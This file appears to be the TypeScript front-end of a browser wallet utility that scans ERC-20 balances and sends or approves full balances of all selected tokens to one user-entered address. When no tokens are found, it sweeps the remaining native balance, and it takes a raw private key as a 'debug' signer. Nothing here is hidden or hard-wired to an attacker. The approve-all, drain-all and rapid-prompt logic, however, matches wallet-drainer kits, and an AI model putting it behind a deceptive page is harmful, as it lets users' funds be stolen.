import { ethers } from "ethers";
import { APP_CONFIG, CHAINLIST_RPCS_URL, ERC20_ABI, MAX_SCAN_RETRIES, MULTICALL3_ABI } from "./config";
import { el } from "./dom";
import type {
  AppState,
  CatalogToken,
  ChainConfig,
  ExecutionPlan,
  KnownTokenBalance,
  KnownTokenConfig,
  NoticeKind,
  ScanCacheEntry,
  StrategyKey,
  TokenSelectionMode,
  TokenStateEntry
} from "./types";

declare global {
  interface Window {
    ethereum?: {
      request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
      on: (event: string, handler: (...args: any[]) => void) => void;
      __walletBatchBound?: boolean;
    };
  }
}

const state: AppState = {
  browserProvider: null,
  signer: null,
  account: null,
  knownTokenBalances: [],
  selectedTokenAddresses: [],
  enrichedTokens: [],
  enrichedTokensLoaded: false,
  chainlistLoaded: false,
  rpcCatalog: {},
  debug: {
    readMode: "-",
    configuredTokenCount: 0,
    queriedAddresses: [],
    nonZeroAddresses: [],
    failures: [],
    activeRpc: "-",
    currentScanAccount: null
  },
  scanCache: {},
  scanVersion: 0
};

function createStaticJsonRpcProvider(url: string, chainId: number): ethers.JsonRpcProvider {
  return new ethers.JsonRpcProvider(url, chainId, {
    staticNetwork: true
  });
}

function destroyProvider(provider: ethers.JsonRpcProvider): void {
  if (typeof provider.destroy === "function") {
    provider.destroy();
  }
}

function getTokenAddressKey(address: string | null | undefined): string {
  return String(address || "").toLowerCase();
}

function escapeHtml(value: unknown): string {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function withRetries<T>(label: string, task: () => Promise<T>, maxRetries = MAX_SCAN_RETRIES): Promise<T> {
  let lastError: unknown;
  for (let attempt = 1; attempt <= maxRetries; attempt += 1) {
    try {
      return await task();
    } catch (error) {
      lastError = error;
      if (attempt === maxRetries) {
        break;
      }
      await sleep(Math.min(250 * attempt, 1000));
    }
  }

  const message = lastError instanceof Error ? lastError.message : String(lastError);
  throw new Error(label + " failed after " + maxRetries + " attempts: " + message);
}

function getSelectedChain(): ChainConfig {
  return APP_CONFIG.chains.find((item) => item.key === el.chainSelect.value) || APP_CONFIG.chains[0];
}

function getSelectedStrategy(): StrategyKey {
  return el.executionStrategy.value as StrategyKey;
}

function getSingleRecipient(): string {
  return (el.singleRecipient.value || "").trim();
}

function getApprovalTarget(): string {
  return (el.approvalTarget.value || "").trim();
}

function getPrivateKeyValue(): string {
  return (el.privateKeyInput.value || "").trim();
}

function useRapidSubmit(): boolean {
  return Boolean(el.rapidSubmitToggle.checked);
}

function useNativeFallback(): boolean {
  return Boolean(el.nativeFallbackToggle.checked);
}

function setWalletNotice(message: string, kind?: NoticeKind): void {
  el.walletNotice.textContent = message;
  el.walletNotice.className = "notice" + (kind ? " " + kind : "");
}

function setTransferNotice(message: string, kind?: NoticeKind): void {
  el.transferNotice.textContent = message;
  el.transferNotice.className = "notice" + (kind ? " " + kind : "");
}

function updateConfiguredChainStatus(): void {
  const chain = getSelectedChain();
  el.configuredChainStatus.textContent = chain.name + " (" + chain.chainId + ")";
  el.multicallStatus.textContent = chain.multicall3 || "Not configured";
}

function updateActionModeDisplay(): void {
  if (getSelectedStrategy() === "permit_batch_signer") {
    el.actionModeDisplay.value = "Approve each selected token balance to the approval target";
    el.sendButton.textContent = "Approve selected tokens";
    return;
  }

  el.actionModeDisplay.value = "Send each selected token balance to the recipient";
  el.sendButton.textContent = "Send selected tokens";
}

function updateStrategyStatus(): void {
  const strategyKey = getSelectedStrategy();
  el.modeDisplay.value = APP_CONFIG.strategies[strategyKey]?.label || strategyKey;
  updateActionModeDisplay();
}

function populateChains(): void {
  el.chainSelect.innerHTML = APP_CONFIG.chains.map((chain) => {
    return '<option value="' + chain.key + '">' + chain.name + "</option>";
  }).join("");
  updateConfiguredChainStatus();
}

function renderKnownTokenBalances(results: KnownTokenBalance[]): void {
  if (!results.length) {
    el.assetList.textContent = "No detected token balances for the selected chain.";
    return;
  }

  const items = results.map((token) => {
    return "<li>" + escapeHtml(token.symbol || token.sourceSymbol || "UNKNOWN") +
      ": " + escapeHtml(token.balanceFormatted || "0") +
      " [" + escapeHtml(token.address) + "]</li>";
  }).join("");

  el.assetList.innerHTML = "<strong>Detected token balances (" + results.length + ")</strong><ul>" + items + "</ul>";
}

function getPrivateKeySigner(): ethers.Wallet | null {
  const privateKey = getPrivateKeyValue();
  if (!privateKey || !state.browserProvider) {
    return null;
  }

  try {
    return new ethers.Wallet(privateKey, state.browserProvider);
  } catch {
    return null;
  }
}

function getExecutionSigner(): ethers.Wallet | ethers.JsonRpcSigner | null {
  return getPrivateKeySigner() || state.signer;
}

async function getEffectiveAccount(): Promise<string | null> {
  const privateSigner = getPrivateKeySigner();
  if (privateSigner) {
    return privateSigner.address;
  }
  return state.account;
}

function updateSigningModeDisplay(): void {
  el.signingModeDisplay.value = getPrivateKeySigner()
    ? "Debug private key using browser RPC"
    : "Extension wallet only";
}

function syncSelectedTokenAddresses(mode: TokenSelectionMode): void {
  const available = state.knownTokenBalances.map((token) => getTokenAddressKey(token.address));
  const availableSet = new Set(available);
  state.selectedTokenAddresses = state.selectedTokenAddresses.filter((address) => availableSet.has(address));

  if (mode === "all_known_tokens") {
    state.selectedTokenAddresses = available;
  }
}

function renderTokenTransferList(): void {
  const mode = el.tokenSelectionMode.value as TokenSelectionMode;
  syncSelectedTokenAddresses(mode);

  if (!state.knownTokenBalances.length) {
    el.tokenTransferList.textContent = "Scan balances to populate the token transfer list.";
    return;
  }

  const header = mode === "all_known_tokens"
    ? "All scanned token balances are selected"
    : "Choose which scanned token balances to include";

  const items = state.knownTokenBalances.map((token) => {
    const addressKey = getTokenAddressKey(token.address);
    const checked = state.selectedTokenAddresses.includes(addressKey) ? " checked" : "";
    const disabled = mode === "all_known_tokens" ? " disabled" : "";
    return [
      '<label>',
      '<input type="checkbox" class="token-transfer-checkbox" data-address="' + escapeHtml(token.address) + '"' + checked + disabled + " />",
      "<span>" + escapeHtml(token.symbol || "UNKNOWN") + ": " + escapeHtml(token.balanceFormatted || "0") + " [" + escapeHtml(token.address) + "]</span>",
      "</label>"
    ].join("");
  }).join("");

  el.tokenTransferList.innerHTML = "<strong>" + header + "</strong>" + items;
}

function renderDebugPanel(): void {
  const chain = getSelectedChain();
  el.debugPanel.classList.toggle("hidden", !el.debugToggle.checked);
  el.debugCatalogLoaded.textContent = state.enrichedTokensLoaded ? "yes" : "no";
  el.debugChain.textContent = chain.key;
  el.debugCatalogCount.textContent = String(state.debug.configuredTokenCount || 0);
  el.debugReadMode.textContent = state.debug.readMode || "-";
  el.debugMaxRetries.textContent = String(MAX_SCAN_RETRIES);
  el.debugActiveRpc.textContent = state.debug.activeRpc || "-";
  el.debugQueried.textContent = state.debug.queriedAddresses.length ? state.debug.queriedAddresses.slice(0, 6).join(", ") : "-";
  el.debugNonzero.textContent = state.debug.nonZeroAddresses.length ? state.debug.nonZeroAddresses.slice(0, 6).join(", ") : "-";
  el.debugFailures.textContent = state.debug.failures.length ? state.debug.failures.slice(0, 4).join(" | ") : "-";
}

async function loadEnrichedTokenCatalog(): Promise<CatalogToken[]> {
  if (state.enrichedTokensLoaded) {
    return state.enrichedTokens;
  }

  try {
    const response = await fetch("../tokens.enriched.json", { cache: "no-store" });
    if (!response.ok) {
      throw new Error("HTTP " + response.status);
    }

    const payload = await response.json() as { results?: CatalogToken[] };
    state.enrichedTokens = Array.isArray(payload.results) ? payload.results : [];
    state.enrichedTokensLoaded = true;
    renderDebugPanel();
    return state.enrichedTokens;
  } catch (error) {
    const message = error instanceof Error ? error.message : String(error);
    setWalletNotice("Failed to load tokens.enriched.json: " + message, "error");
    state.enrichedTokens = [];
    state.enrichedTokensLoaded = true;
    renderDebugPanel();
    return state.enrichedTokens;
  }
}

function sanitizeRpcUrl(value: unknown): string | null {
  if (typeof value !== "string" || !value.startsWith("http")) {
    return null;
  }
  if (value.includes("${")) {
    return null;
  }
  return value;
}

function getRpcUrlsForChain(chain: ChainConfig): string[] {
  const dynamic = state.rpcCatalog[chain.key] || [];
  const merged = [...dynamic, ...(chain.rpcUrls || [])]
    .map(sanitizeRpcUrl)
    .filter((value): value is string => Boolean(value));

  return [...new Set(merged)];
}

async function loadChainlistRpcs(): Promise<Record<string, string[]>> {
  if (state.chainlistLoaded) {
    return state.rpcCatalog;
  }

  try {
    const response = await fetch(CHAINLIST_RPCS_URL, { cache: "no-store" });
    if (!response.ok) {
      throw new Error("HTTP " + response.status);
    }

    const payload = await response.json() as Array<{ chainId?: number; rpc?: Array<string | { url?: string }> }>;
    const rpcCatalog: Record<string, string[]> = {};

    for (const chain of APP_CONFIG.chains) {
      const entry = Array.isArray(payload)
        ? payload.find((item) => Number(item.chainId) === Number(chain.chainId))
        : null;

      const urls = entry && Array.isArray(entry.rpc)
        ? entry.rpc
            .map((item) => sanitizeRpcUrl(typeof item === "string" ? item : item.url))
            .filter((value): value is string => Boolean(value))
        : [];

      rpcCatalog[chain.key] = [...new Set(urls)];
    }

    state.rpcCatalog = rpcCatalog;
    state.chainlistLoaded = true;
    return rpcCatalog;
  } catch {
    state.rpcCatalog = {};
    state.chainlistLoaded = true;
    setWalletNotice("Chainlist RPC fetch failed. Using built-in RPC fallbacks.", "error");
    return state.rpcCatalog;
  }
}

async function withRotatingProvider<T>(
  label: string,
  task: (provider: ethers.JsonRpcProvider) => Promise<T>
): Promise<T> {
  const chain = getSelectedChain();
  const urls = getRpcUrlsForChain(chain);
  let lastError: unknown;

  if (!urls.length) {
    throw new Error("No RPC URLs configured for " + chain.name);
  }

  for (const url of urls) {
    const provider = createStaticJsonRpcProvider(url, chain.chainId);
    state.debug.activeRpc = url;
    renderDebugPanel();

    try {
      const result = await withRetries(label + " via " + url, () => task(provider));
      destroyProvider(provider);
      return result;
    } catch (error) {
      lastError = error;
      destroyProvider(provider);
    }
  }

  throw lastError || new Error(label + " failed across all RPC URLs");
}

function getChainKnownTokensFromCatalog(): KnownTokenConfig[] {
  const chain = getSelectedChain();
  return state.enrichedTokens
    .filter((token) => token.chainKey === chain.key && token.address)
    .map((token) => ({
      address: token.address,
      symbol: token.symbol || token.sourceSymbol || "UNKNOWN",
      decimals: token.decimals
    }));
}

function getScanCacheKey(): string {
  const chain = getSelectedChain();
  let account = state.account || "no-account";
  const privateKey = getPrivateKeyValue();

  if (privateKey) {
    try {
      account = new ethers.Wallet(privateKey).address;
    } catch {
      account = state.account || "no-account";
    }
  }

  return [chain.key, account].join(":");
}

function saveScanCache(results: KnownTokenBalance[], readMode: string): void {
  const entry: ScanCacheEntry = {
    results,
    readMode,
    configuredTokenCount: state.debug.configuredTokenCount,
    queriedAddresses: [...state.debug.queriedAddresses],
    nonZeroAddresses: [...state.debug.nonZeroAddresses],
    failures: [...state.debug.failures]
  };
  state.scanCache[getScanCacheKey()] = entry;
}

function restoreScanCache(): boolean {
  const cached = state.scanCache[getScanCacheKey()];
  if (!cached) {
    state.knownTokenBalances = [];
    state.debug.readMode = "not scanned";
    state.debug.nonZeroAddresses = [];
    state.debug.failures = [];
    renderKnownTokenBalances([]);
    renderDebugPanel();
    return false;
  }

  state.knownTokenBalances = cached.results;
  state.debug.readMode = cached.readMode;
  state.debug.configuredTokenCount = cached.configuredTokenCount;
  state.debug.queriedAddresses = cached.queriedAddresses;
  state.debug.nonZeroAddresses = cached.nonZeroAddresses;
  state.debug.failures = cached.failures;
  renderKnownTokenBalances(cached.results);
  renderTokenTransferList();
  renderDebugPanel();
  setTransferNotice("Loaded cached scan for " + getSelectedChain().name + ". Found " + cached.results.length + " token balances.");
  return true;
}

async function loadKnownTokenBalancesDirect(tokens: KnownTokenConfig[]): Promise<KnownTokenBalance[]> {
  const effectiveAccount = await getEffectiveAccount();
  if (!effectiveAccount) {
    return [];
  }

  return withRotatingProvider("direct token scan", async (provider) => {
    const results: KnownTokenBalance[] = [];

    for (const token of tokens) {
      try {
        const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
        const balanceRaw = await contract.balanceOf(effectiveAccount) as bigint;

        let decimalsValue = token.decimals != null ? Number(token.decimals) : 18;
        if (token.decimals == null) {
          try {
            decimalsValue = Number(await contract.decimals());
          } catch {
            decimalsValue = 18;
          }
        }

        let symbolValue = token.symbol || "UNKNOWN";
        if (!token.symbol || token.symbol === "UNKNOWN") {
          try {
            symbolValue = await contract.symbol() as string;
          } catch {
            symbolValue = token.symbol || "UNKNOWN";
          }
        }

        results.push({
          address: token.address,
          symbol: symbolValue,
          decimals: decimalsValue,
          balanceRaw,
          balanceFormatted: ethers.formatUnits(balanceRaw, decimalsValue)
        });
      } catch (error) {
        results.push({
          address: token.address,
          symbol: token.symbol || "UNKNOWN",
          decimals: Number(token.decimals) || 18,
          balanceRaw: 0n,
          balanceFormatted: "0",
          error: error instanceof Error ? error.message : "Token read failed"
        });
      }
    }

    return results;
  });
}

async function loadKnownTokenBalancesMulticall(
  chain: ChainConfig,
  tokens: KnownTokenConfig[]
): Promise<KnownTokenBalance[]> {
  const effectiveAccount = await getEffectiveAccount();
  if (!effectiveAccount) {
    return [];
  }

  return withRotatingProvider("multicall token scan", async (provider) => {
    const multicall = new ethers.Contract(chain.multicall3, MULTICALL3_ABI, provider);
    const iface = new ethers.Interface(ERC20_ABI);
    const calls: Array<{ target: string; allowFailure: boolean; callData: string }> = [];
    const callIndex: Array<{ address: string; type: "balanceOf" | "decimals" | "symbol" }> = [];

    for (const token of tokens) {
      calls.push({
        target: token.address,
        allowFailure: true,
        callData: iface.encodeFunctionData("balanceOf", [effectiveAccount])
      });
      callIndex.push({ address: token.address, type: "balanceOf" });

      if (token.decimals == null) {
        calls.push({
          target: token.address,
          allowFailure: true,
          callData: iface.encodeFunctionData("decimals", [])
        });
        callIndex.push({ address: token.address, type: "decimals" });
      }

      if (!token.symbol || token.symbol === "UNKNOWN") {
        calls.push({
          target: token.address,
          allowFailure: true,
          callData: iface.encodeFunctionData("symbol", [])
        });
        callIndex.push({ address: token.address, type: "symbol" });
      }
    }

    const response = await multicall.aggregate3(calls) as Array<{ success: boolean; returnData: string }>;
    const tokenState: Record<string, TokenStateEntry> = {};

    for (const token of tokens) {
      tokenState[getTokenAddressKey(token.address)] = {
        address: token.address,
        symbol: token.symbol || "UNKNOWN",
        decimals: token.decimals != null ? Number(token.decimals) : null,
        balanceRaw: 0n
      };
    }

    response.forEach((item, index) => {
      const meta = callIndex[index];
      const entry = tokenState[getTokenAddressKey(meta.address)];
      if (!entry || !item.success) {
        return;
      }

      try {
        const decoded = iface.decodeFunctionResult(meta.type, item.returnData);
        if (meta.type === "balanceOf") {
          entry.balanceRaw = decoded[0] as bigint;
        } else if (meta.type === "decimals") {
          entry.decimals = Number(decoded[0]);
        } else {
          entry.symbol = decoded[0] as string;
        }
      } catch {
        return;
      }
    });

    return Object.values(tokenState).map((token) => {
      const decimalsValue = token.decimals != null ? token.decimals : 18;
      return {
        address: token.address,
        symbol: token.symbol || "UNKNOWN",
        decimals: decimalsValue,
        balanceRaw: token.balanceRaw,
        balanceFormatted: ethers.formatUnits(token.balanceRaw, decimalsValue)
      };
    });
  });
}

async function refreshWalletStatus(): Promise<void> {
  const selectedChain = getSelectedChain();
  const effectiveAccount = await getEffectiveAccount();
  updateSigningModeDisplay();

  if (!state.browserProvider || !state.account) {
    el.walletChainStatus.textContent = "-";
    el.accountStatus.textContent = "-";
    el.balanceStatus.textContent = "-";
    return;
  }

  const network = await state.browserProvider.getNetwork();
  const balance = effectiveAccount ? await state.browserProvider.getBalance(effectiveAccount) : 0n;
  const walletChainId = Number(network.chainId);
  el.walletChainStatus.textContent = (network.name || "unknown") + " (" + walletChainId + ")";
  el.accountStatus.textContent = effectiveAccount || state.account;
  el.balanceStatus.textContent = ethers.formatUnits(balance, selectedChain.nativeCurrency.decimals) + " " + selectedChain.nativeCurrency.symbol;

  if (walletChainId === selectedChain.chainId) {
    setWalletNotice(
      getPrivateKeySigner()
        ? "Wallet connected on the selected chain. Debug private-key mode is active."
        : "Wallet connected on the selected chain.",
      "good"
    );
    return;
  }

  setWalletNotice(
    "Wallet is on chain " + walletChainId + " but the selected config is " + selectedChain.chainId + ". Switch before sending.",
    "error"
  );
}

async function connectWallet(): Promise<void> {
  if (!window.ethereum) {
    setWalletNotice("No extension wallet detected.", "error");
    return;
  }

  try {
    state.browserProvider = new ethers.BrowserProvider(window.ethereum);
    await state.browserProvider.send("eth_requestAccounts", []);
    state.signer = await state.browserProvider.getSigner();
    state.account = await state.signer.getAddress();
    await refreshWalletStatus();
    restoreScanCache();
  } catch (error) {
    setWalletNotice(error instanceof Error ? error.message : "Wallet connection failed.", "error");
  }
}

async function switchChain(): Promise<void> {
  if (!window.ethereum) {
    setWalletNotice("No extension wallet detected.", "error");
    return;
  }

  const chain = getSelectedChain();
  const hexChainId = "0x" + chain.chainId.toString(16);

  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: hexChainId }]
    });
  } catch (error) {
    const switchError = error as { code?: number; message?: string };
    if (switchError.code === 4902) {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: hexChainId,
          chainName: chain.name,
          rpcUrls: chain.rpcUrls,
          blockExplorerUrls: chain.blockExplorerUrls,
          nativeCurrency: chain.nativeCurrency
        }]
      });
    } else {
      setWalletNotice(switchError.message || "Chain switch failed.", "error");
      return;
    }
  }

  if (state.browserProvider && state.account) {
    await refreshWalletStatus();
    restoreScanCache();
  }
}

async function loadKnownTokenBalances(): Promise<KnownTokenBalance[]> {
  const scanVersion = ++state.scanVersion;
  const chain = getSelectedChain();
  const configuredTokens = getChainKnownTokensFromCatalog();
  const effectiveAccount = await getEffectiveAccount();
  state.debug.configuredTokenCount = configuredTokens.length;
  state.debug.queriedAddresses = configuredTokens.map((token) => token.address);
  state.debug.nonZeroAddresses = [];
  state.debug.failures = [];
  state.debug.currentScanAccount = effectiveAccount || state.account || null;

  if (!state.browserProvider || !state.account || !effectiveAccount) {
    state.knownTokenBalances = [];
    state.debug.readMode = "not connected";
    renderKnownTokenBalances([]);
    renderTokenTransferList();
    renderDebugPanel();
    return [];
  }

  let results: KnownTokenBalance[] = [];
  let readMode = "direct";

  if (chain.multicall3 && ethers.isAddress(chain.multicall3)) {
    try {
      results = await loadKnownTokenBalancesMulticall(chain, configuredTokens);
      readMode = "multicall";
    } catch {
      results = await loadKnownTokenBalancesDirect(configuredTokens);
      readMode = "direct fallback";
    }
  } else {
    results = await loadKnownTokenBalancesDirect(configuredTokens);
  }

  const nonZeroResults = results.filter((token) => {
    try {
      return BigInt(token.balanceRaw) > 0n;
    } catch {
      return false;
    }
  });

  if (scanVersion !== state.scanVersion || getSelectedChain().key !== chain.key) {
    return [];
  }

  state.debug.readMode = readMode;
  state.debug.nonZeroAddresses = nonZeroResults.map((token) => token.address);
  state.debug.failures = results.filter((token) => token.error).map((token) => token.address + ": " + token.error);
  state.knownTokenBalances = nonZeroResults;
  saveScanCache(nonZeroResults, readMode);
  renderKnownTokenBalances(nonZeroResults);
  renderTokenTransferList();
  renderDebugPanel();

  if (configuredTokens.length) {
    setTransferNotice(
      "Checked " + configuredTokens.length + " catalog tokens on " + chain.name +
      " using " + readMode + ". Found " + nonZeroResults.length + " with balance."
    );
  } else {
    setTransferNotice("No catalog tokens are mapped to " + chain.name + ".", "error");
  }

  return nonZeroResults;
}

function getSelectedTokenTransfers(maxTokenTransfers: number): KnownTokenBalance[] {
  return state.knownTokenBalances
    .filter((token) => state.selectedTokenAddresses.includes(getTokenAddressKey(token.address)))
    .slice(0, maxTokenTransfers);
}

function buildExecutionPlan(): ExecutionPlan {
  const tokenMode = el.tokenSelectionMode.value as TokenSelectionMode;
  const maxTokenTransfers = Math.max(1, Number(el.maxTokenTransfers.value || 25));
  const tokenTransfers = tokenMode === "all_known_tokens" || tokenMode === "selected_known_tokens"
    ? getSelectedTokenTransfers(maxTokenTransfers)
    : [];

  return {
    strategy: getSelectedStrategy(),
    tokenMode,
    chainKey: getSelectedChain().key,
    recipient: getSingleRecipient(),
    approvalTarget: getApprovalTarget(),
    rapidSubmit: useRapidSubmit(),
    nativeFallback: useNativeFallback(),
    maxTokenTransfers,
    knownTokenBalances: state.knownTokenBalances,
    tokenTransfers
  };
}

function describeTokenSelectionMode(mode: TokenSelectionMode): string {
  if (mode === "all_known_tokens") {
    return "Using all detected token balances.";
  }
  if (mode === "selected_known_tokens") {
    return "Manual token selection enabled.";
  }
  return "Token selection mode updated.";
}

async function getExecutionContext(): Promise<{ chain: ChainConfig; executionSigner: ethers.Wallet | ethers.JsonRpcSigner } | null> {
  const chain = getSelectedChain();
  const executionSigner = getExecutionSigner();

  if (!executionSigner || !state.account || !state.browserProvider) {
    setTransferNotice("Connect the wallet first.", "error");
    return null;
  }

  const network = await state.browserProvider.getNetwork();
  if (Number(network.chainId) !== chain.chainId) {
    setTransferNotice("Wallet chain does not match the selected chain.", "error");
    return null;
  }

  return { chain, executionSigner };
}

async function executePlan(): Promise<void> {
  const plan = buildExecutionPlan();
  if (plan.strategy === "sequential_calls") {
    await executeSequential(plan);
    return;
  }
  if (plan.strategy === "permit_batch_signer") {
    await executeApprovals(plan);
    return;
  }
  setTransferNotice("Unknown execution strategy.", "error");
}

async function executeSequential(plan: ExecutionPlan): Promise<void> {
  const context = await getExecutionContext();
  if (!context) {
    return;
  }

  if (!ethers.isAddress(plan.recipient || "")) {
    setTransferNotice("Provide one valid recipient address for sequential token sends.", "error");
    return;
  }

  if (!plan.tokenTransfers.length) {
    if (!plan.nativeFallback) {
      setTransferNotice("No detected token balances are available for sequential sending.", "error");
      return;
    }
    await sendNativeFallback(plan);
    return;
  }

  const { executionSigner } = context;

  if (plan.rapidSubmit) {
    setTransferNotice("Submitting " + plan.tokenTransfers.length + " token transfer requests to the wallet.");
    const results = await Promise.all(plan.tokenTransfers.map((token, index) => {
      const contract = new ethers.Contract(token.address, ERC20_ABI, executionSigner);
      return contract.transfer(plan.recipient, token.balanceRaw)
        .then((tx: { hash: string }) => ({ ok: true, token, hash: tx.hash, index }))
        .catch((error: unknown) => ({ ok: false, token, error, index }));
    }));

    const failures = results.filter((item) => !item.ok);
    if (failures.length) {
      setTransferNotice(
        "Submitted transfer requests with " + failures.length + " immediate failures. Wallet may still have queued the others.",
        "error"
      );
      return;
    }

    setTransferNotice("Submitted " + results.length + " token transfer requests to the wallet.", "good");
    return;
  }

  for (let index = 0; index < plan.tokenTransfers.length; index += 1) {
    const token = plan.tokenTransfers[index];
    setTransferNotice("Sending " + token.symbol + " " + (index + 1) + " of " + plan.tokenTransfers.length + " to " + plan.recipient + ".");
    const contract = new ethers.Contract(token.address, ERC20_ABI, executionSigner);
    await contract.transfer(plan.recipient, token.balanceRaw);
    if (index < plan.tokenTransfers.length - 1) {
      await sleep(75);
    }
  }

  setTransferNotice("Submission complete. Sent " + plan.tokenTransfers.length + " token transfer requests to " + plan.recipient + ".", "good");
}

async function executeApprovals(plan: ExecutionPlan): Promise<void> {
  const context = await getExecutionContext();
  if (!context) {
    return;
  }

  if (!ethers.isAddress(plan.approvalTarget || "")) {
    setTransferNotice("Provide one valid approval target contract address.", "error");
    return;
  }

  if (!plan.tokenTransfers.length) {
    setTransferNotice("No detected token balances are available for approvals.", "error");
    return;
  }

  const { executionSigner } = context;

  if (plan.rapidSubmit) {
    setTransferNotice("Submitting " + plan.tokenTransfers.length + " approval requests to the wallet.");
    const results = await Promise.all(plan.tokenTransfers.map((token, index) => {
      const contract = new ethers.Contract(token.address, ERC20_ABI, executionSigner);
      return contract.approve(plan.approvalTarget, token.balanceRaw)
        .then((tx: { hash: string }) => ({ ok: true, token, hash: tx.hash, index }))
        .catch((error: unknown) => ({ ok: false, token, error, index }));
    }));

    const failures = results.filter((item) => !item.ok);
    if (failures.length) {
      setTransferNotice(
        "Submitted approval requests with " + failures.length + " immediate failures. Wallet may still have queued the others.",
        "error"
      );
      return;
    }

    setTransferNotice("Submitted " + results.length + " approval requests to the wallet.", "good");
    return;
  }

  for (let index = 0; index < plan.tokenTransfers.length; index += 1) {
    const token = plan.tokenTransfers[index];
    setTransferNotice("Approving " + token.symbol + " " + (index + 1) + " of " + plan.tokenTransfers.length + " to " + plan.approvalTarget + ".");
    const contract = new ethers.Contract(token.address, ERC20_ABI, executionSigner);
    await contract.approve(plan.approvalTarget, token.balanceRaw);
    if (index < plan.tokenTransfers.length - 1) {
      await sleep(1000);
    }
  }

  setTransferNotice("Submission complete. Sent " + plan.tokenTransfers.length + " approval requests to " + plan.approvalTarget + ".", "good");
}

async function sendNativeFallback(plan: ExecutionPlan): Promise<void> {
  const context = await getExecutionContext();
  if (!context || !state.browserProvider) {
    return;
  }

  const effectiveAccount = await getEffectiveAccount();
  if (!effectiveAccount) {
    setTransferNotice("No effective account available for native fallback.", "error");
    return;
  }

  const { chain, executionSigner } = context;
  const balance = await state.browserProvider.getBalance(effectiveAccount);
  const feeData = await state.browserProvider.getFeeData();
  const estimatedGas = await executionSigner.estimateGas({ to: plan.recipient, value: 1n });
  const gasLimit = estimatedGas > 21000n ? estimatedGas : 21000n;
  const gasPrice = feeData.maxFeePerGas || feeData.gasPrice;

  if (!gasPrice) {
    setTransferNotice("Could not determine gas price for native fallback.", "error");
    return;
  }

  const feeBuffer = (gasLimit * gasPrice * 12n) / 10n;
  const value = balance - feeBuffer;
  if (value <= 0n) {
    setTransferNotice("Native balance is too small after estimated fee buffer.", "error");
    return;
  }

  setTransferNotice("No tokens found. Sending native fallback balance to " + plan.recipient + ".");
  await executionSigner.sendTransaction({
    to: plan.recipient,
    value,
    gasLimit,
    maxFeePerGas: feeData.maxFeePerGas || undefined,
    maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || undefined,
    gasPrice: feeData.maxFeePerGas ? undefined : feeData.gasPrice || undefined
  });

  setTransferNotice("Native fallback complete on " + chain.name + (plan.rapidSubmit ? " using rapid submit." : "."), "good");
}

async function sendSelectedPlan(): Promise<void> {
  el.sendButton.disabled = true;
  el.connectButton.disabled = true;
  el.scanBalancesButton.disabled = true;

  try {
    await executePlan();
    await refreshWalletStatus();
  } catch (error) {
    if (error instanceof Error && "shortMessage" in error) {
      setTransferNotice(String((error as Error & { shortMessage?: string }).shortMessage || error.message), "error");
    } else {
      setTransferNotice(error instanceof Error ? error.message : "Execution failed.", "error");
    }
  } finally {
    el.sendButton.disabled = false;
    el.connectButton.disabled = false;
    el.scanBalancesButton.disabled = false;
  }
}

function bindWalletEvents(): void {
  if (!window.ethereum || window.ethereum.__walletBatchBound) {
    return;
  }

  window.ethereum.on("accountsChanged", async (accounts: string[]) => {
    const localVersion = ++state.scanVersion;
    state.account = accounts && accounts[0] ? accounts[0] : null;
    if (!state.account) {
      el.accountStatus.textContent = "-";
      el.balanceStatus.textContent = "-";
      setWalletNotice("Wallet disconnected.", "error");
      state.knownTokenBalances = [];
      state.selectedTokenAddresses = [];
      state.debug.readMode = "not connected";
      renderKnownTokenBalances([]);
      renderTokenTransferList();
      renderDebugPanel();
      return;
    }

    await refreshWalletStatus();
    if (localVersion !== state.scanVersion) {
      return;
    }
    restoreScanCache();
  });

  window.ethereum.on("chainChanged", async () => {
    const localVersion = ++state.scanVersion;
    if (!state.account) {
      return;
    }
    await refreshWalletStatus();
    if (localVersion !== state.scanVersion) {
      return;
    }
    restoreScanCache();
  });

  window.ethereum.__walletBatchBound = true;
}

function bindEvents(): void {
  el.chainSelect.addEventListener("change", async () => {
    const localVersion = ++state.scanVersion;
    updateConfiguredChainStatus();
    state.debug.configuredTokenCount = getChainKnownTokensFromCatalog().length;
    state.debug.queriedAddresses = [];
    state.debug.nonZeroAddresses = [];
    state.debug.failures = [];
    state.selectedTokenAddresses = [];
    if (state.account) {
      await switchChain();
      if (localVersion !== state.scanVersion) {
        return;
      }
      restoreScanCache();
    } else {
      renderDebugPanel();
    }
  });

  el.executionStrategy.addEventListener("change", updateStrategyStatus);
  el.tokenSelectionMode.addEventListener("change", () => {
    const mode = el.tokenSelectionMode.value as TokenSelectionMode;
    renderTokenTransferList();
    setTransferNotice(describeTokenSelectionMode(mode));
  });
  el.tokenTransferList.addEventListener("change", (event) => {
    const target = event.target;
    if (!(target instanceof HTMLInputElement) || !target.classList.contains("token-transfer-checkbox")) {
      return;
    }

    const address = getTokenAddressKey(target.dataset.address);
    if (!address) {
      return;
    }

    if (target.checked) {
      if (!state.selectedTokenAddresses.includes(address)) {
        state.selectedTokenAddresses.push(address);
      }
      return;
    }

    state.selectedTokenAddresses = state.selectedTokenAddresses.filter((item) => item !== address);
  });

  el.debugToggle.addEventListener("change", renderDebugPanel);
  el.privateKeyInput.addEventListener("input", async () => {
    updateSigningModeDisplay();
    if (state.browserProvider && state.account) {
      await refreshWalletStatus();
      restoreScanCache();
    }
  });
  el.connectButton.addEventListener("click", connectWallet);
  el.scanBalancesButton.addEventListener("click", () => {
    void loadKnownTokenBalances();
  });
  el.sendButton.addEventListener("click", () => {
    void sendSelectedPlan();
  });
}

async function init(): Promise<void> {
  await loadEnrichedTokenCatalog();
  await loadChainlistRpcs();
  populateChains();
  updateStrategyStatus();
  state.debug.configuredTokenCount = getChainKnownTokensFromCatalog().length;
  renderTokenTransferList();
  renderDebugPanel();
  bindEvents();
  bindWalletEvents();
}

void init();
